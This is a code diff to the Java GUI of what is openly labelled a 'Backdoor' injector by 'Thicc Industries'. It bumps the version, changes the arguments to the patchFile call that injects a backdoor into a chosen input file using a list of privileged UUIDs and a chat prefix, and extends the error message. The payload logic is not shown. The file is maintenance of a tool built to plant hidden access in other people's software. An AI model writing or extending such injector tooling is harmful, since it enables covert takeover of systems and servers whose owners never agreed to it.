@@ -34,8 +34,8 @@ public class InjectorGUI{
                 JOptionPane.showMessageDialog(
                         null,
                         "Created by: Thicc Industries,\n" +
-                                "Backdoor Version: 2.2.2\n" +
-                                "Release Date: March 25 2022\n" +
+                                "Backdoor Version: 2.2.3\n" +
+                                "Release Date: May 05 2022\n" +
                                 "License: GPL v3.0",
                         "Thicc Industries Injector",
                         JOptionPane.INFORMATION_MESSAGE
@@ -126,12 +126,12 @@ public class InjectorGUI{
         String[] splitUUID = UUIDList.split(",");
 
         Injector.SimpleConfig sc = new Injector.SimpleConfig(UUIDsAreUsernames, splitUUID, ChatPrefix, InjectOther, Warnings);
-        boolean result2 = Injector.patchFile(InPath, OutPath, sc, true, false);
+        boolean result2 = Injector.patchFile(InPath, OutPath, sc, true, true, true);
 
         if(result2){
             JOptionPane.showMessageDialog(null, "Backdoor injection complete.\nIf this project helped you, considering starring it on GitHub.", "Thicc Industries Injector", JOptionPane.INFORMATION_MESSAGE);
         }else{
-            JOptionPane.showMessageDialog(null, "Backdoor injection failed.\nPlease create a GitHub issue report if necessary.", "Thicc Industries Injector", JOptionPane.ERROR_MESSAGE);
+            JOptionPane.showMessageDialog(null, "Backdoor injection failed.\nPlease create a GitHub issue report if necessary.\nPlease run the injector again with debug messages on before submitting issues.", "Thicc Industries Injector", JOptionPane.ERROR_MESSAGE);
         }
     }
 
